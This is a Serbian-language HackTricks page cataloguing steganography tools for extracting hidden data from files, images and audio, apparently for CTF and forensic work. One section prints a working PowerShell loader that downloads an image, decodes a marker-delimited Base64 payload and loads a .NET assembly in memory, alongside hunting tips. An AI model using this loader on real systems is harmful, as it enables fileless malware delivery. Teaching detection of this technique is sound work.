# Stego trikovi

{{#include ../banners/hacktricks-training.md}}

## **Ekstrakcija podataka iz fajlova**

### **Binwalk**

Alat za pretragu binarnih fajlova radi ugrađenih skrivenih fajlova i podataka. Instalira se preko `apt`, a njegov izvor je dostupan na [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Vraća fajlove na osnovu njihovih zaglavlja i podnožja, korisno za png slike. Instalira se preko `apt`, izvor je na [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Pomaže pri pregledanju metapodataka fajla, dostupan [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Slično exiftool-u, za pregled metapodataka. Može se instalirati preko `apt`, izvor na [GitHub](https://github.com/Exiv2/exiv2), i ima [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Fajl**

Identifikujte tip fajla sa kojim radite.

### **Strings**

Izvlači čitljive strings iz fajlova, koristeći različita podešavanja enkodovanja za filtriranje izlaza.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Koristan za upoređivanje izmenjene datoteke sa originalnom verzijom pronađenom online.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Ekstrakcija skrivenih podataka iz teksta**

### **Skriveni podaci u razmacima**

Nevidljivi karakteri u naizgled praznim razmacima mogu skrivati informacije. Da biste izvukli te podatke, posetite [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Ekstrakcija podataka iz slika**

### **Identifikovanje detalja slike pomoću GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) služi za određivanje tipova fajlova slika i identifikovanje potencijalnih oštećenja. Pokrenite naredbu ispod da biste pregledali sliku:
```bash
./magick identify -verbose stego.jpg
```
Da biste pokušali popraviti oštećenu sliku, dodavanje metadata comment-a može pomoći:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide za skrivanje podataka**

Steghide omogućava skrivanje podataka unutar `JPEG, BMP, WAV, and AU` fajlova; može da ugrađuje i izvlači enkriptovane podatke. Instalacija je jednostavna pomoću `apt`, a njegov [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Komande:**

- `steghide info file` otkriva da li fajl sadrži skrivene podatke.
- `steghide extract -sf file [--passphrase password]` ekstrahuje skrivene podatke, lozinka nije obavezna.

Za ekstrakciju putem web-a, posetite [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Da biste pokušali password cracking na Steghide, koristite [stegcracker](https://github.com/Paradoxis/StegCracker.git) na sledeći način:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zsteg je specijalizovan za otkrivanje skrivenih podataka u PNG i BMP fajlovima. Instalacija se obavlja preko `gem install zsteg`, a izvor je na [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` primenjuje sve metode detekcije na fajlu.
- `zsteg -E file` određuje payload za ekstrakciju podataka.

### **StegoVeritas and Stegsolve**

**stegoVeritas** proverava metadata, izvršava transformacije slike i primenjuje LSB brute forcing, između ostalog. Koristite `stegoveritas.py -h` za potpuni spisak opcija i `stegoveritas.py stego.jpg` za izvršavanje svih provera.

**Stegsolve** primenjuje razne kolor filtere kako bi otkrio skrivene tekstove ili poruke unutar slika. Dostupan je na [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT) tehnike mogu otkriti sakriveni sadržaj u slikama. Korisni resursi uključuju:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy omogućava ubacivanje informacija u slikovne i audio fajlove, podržavajući formate kao što su PNG, BMP, GIF, WebP i WAV. Dostupan je na [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck for PNG File Analysis**

Za analizu PNG fajlova ili za potvrdu njihove autentičnosti, koristite:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Dodatni alati za analizu slika**

Za dalje istraživanje, posetite:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Base64 payloadi ograničeni markerima sakriveni u slikama (isporuka malvera)

Uobičajeni loaderi sve češće skrivaju Base64-enkodirane payload-e kao običan tekst unutar inače validnih slika (često GIF/PNG). Umesto pixel-level LSB tehnike, payload je ograničen jedinstvenim start/end marker stringovima ugrađenim u tekst/metadata fajla. Zatim PowerShell stager:

- Preuzima sliku preko HTTP(S)
- Pronalaži marker stringove (primećeni primeri: <<sudo_png>> … <<sudo_odt>>)
- Ekstrahuje tekst između markera i Base64-dekodira ga u bajtove
- Učitava .NET assembly u memoriji i poziva poznatu ulaznu metodu (fajl se ne upisuje na disk)

Minimalni PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Beleške
- Ovo spada pod ATT&CK T1027.003 (steganography). Marker strings variraju između kampanja.
- Hunting: skenirajte preuzete slike za poznate delimitere; označite `PowerShell` koji koristi `DownloadString` praćen `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Ekstrakcija podataka iz audio zapisa**

**Audio steganography** nudi jedinstven način da se informacije sakriju unutar zvučnih fajlova. Različiti alati se koriste za ugradnju ili izvlačenje skrivenog sadržaja.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide je svestran alat za skrivanje podataka u JPEG, BMP, WAV i AU fajlovima. Detaljna uputstva su data u [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Ovaj alat je kompatibilan sa više formata uključujući PNG, BMP, GIF, WebP i WAV. Za više informacija pogledajte [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg je ključan za procenu integriteta audio fajlova, prikazujući detaljne informacije i identifikujući eventualne nepravilnosti.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg je odličan u skrivanju i izvlačenju podataka unutar WAV fajlova koristeći strategiju najmanje značajnog bita (LSB). Dostupan je na [GitHub](https://github.com/ragibson/Steganography#WavSteg). Komande uključuju:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound omogućava enkripciju i otkrivanje informacija unutar audio fajlova koristeći AES-256. Može se preuzeti sa [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Neprocenjiv alat za vizuelnu i analitičku inspekciju audio fajlova — Sonic Visualizer može otkriti skrivene elemente koje drugi alati ne mogu detektovati. Posetite [official website](https://www.sonicvisualiser.org/) za više informacija.

### **DTMF Tones - Dial Tones**

Detekcija DTMF tonova u audio fajlovima može se postići pomoću online alata kao što su [this DTMF detector](https://unframework.github.io/dtmf-detect/) i [DialABC](http://dialabc.com/sound/detect/index.html).

## **Ostale tehnike**

### **Binary Length SQRT - QR Code**

Binarni podaci čija dužina predstavlja savršen kvadrat mogu predstavljati QR code. Koristite ovaj snippet da proverite:
```python
import math
math.sqrt(2500) #50
```
Za konverziju binarnog niza u sliku, pogledajte [dcode](https://www.dcode.fr/binary-image). Za čitanje QR kodova, koristite [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Prevođenje Brajevog pisma**

Za prevođenje Brajevog pisma, [Branah Braille Translator](https://www.branah.com/braille-translator) je odličan resurs.

## **Reference**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
